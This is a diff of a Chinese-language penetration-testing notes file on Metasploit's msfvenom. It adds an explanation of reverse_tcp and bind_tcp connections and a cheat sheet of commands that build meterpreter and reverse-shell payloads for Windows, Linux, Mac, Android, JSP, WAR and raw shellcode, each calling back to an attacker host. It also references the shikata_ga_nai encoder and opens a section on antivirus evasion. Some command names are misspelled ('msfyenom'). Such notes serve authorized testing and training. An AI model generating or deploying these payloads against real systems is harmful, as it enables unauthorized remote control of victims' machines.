@@ -34,18 +34,42 @@ svchost.exe进程,自己测试的时候不建议到这个进程而是其他的�
 - (2)使用-p指定使用的攻击载荷模块,使用-e指定使用x86／shikata_ga_nai编码器,使用-f选项告
 诉MSF编码器输出格式为exe,-o选项指定输出的文件名为payload.exe,保存在根自录下.
 
-## 各平台的 payload
+## 正向反向payload区别, reverse_tcp和bind_tcp区别：
+目标机器可以上网，那就使用reverse_tcp，让目标机器出网连接我们的服务器
+无法外网的，使用正向连接，反向出不来 windows/x64/meterpreter/bind_tcp
+
+注意，获得meterpreter的顺序为：先在win机器上执行我们的exe，然后再在msf上执行`exploit`。与`reverse_tcp`的顺序刚好相反。
+
+```shell
+[reverse_tcp]
+attacker -> [contact me at the port 4444] -> victim
+
+after the payload is executed
+attacker <-> [port 4444] <-> victim
+
+[bind_tcp]
+attacker -> [open the way for me in the port 4444] -> victim
+
+after execution
+attacker <-> [port 4444] <-> victim
+```
+
+
+## 各平台的 payload/bin/exe/反弹shell
 https://micro8.gitbook.io/micro8/contents-1/1-10/10msfvenom-chang-yong-sheng-cheng-payload-ming-ling
+
 ```bash
-# Linux
-msfyenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -a x86 --platform Linux -f elf > shell.elf
 # Windows
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=1234 -f exe > shell.exe
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1234 -f exe > shell.exe
 msfvenom -p windows/x64/powershell_reverse_tcp LHOST=$ip LPORT=1234  -f raw -o payload.ps1
 
+# Linux
+msfyenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -a x86 --platform Linux -f elf > shell.elf
+
 # Mac
 msfyenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho>shell.macho
+
 # Android
 msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -f raw > shell.apk
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 R > test.apk
@@ -57,7 +81,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YourP Address> LPORT=<Your Po
 # JSP
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address>LPORT=<Your Port to Connect On> -f raw > shell.jsp
 # WAR
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address>LPORT=<Your Port to Connect On> -f war > shell.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=1234 -f war > shell.war
+
+# shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
 ```
 免杀版命令
 ```shell
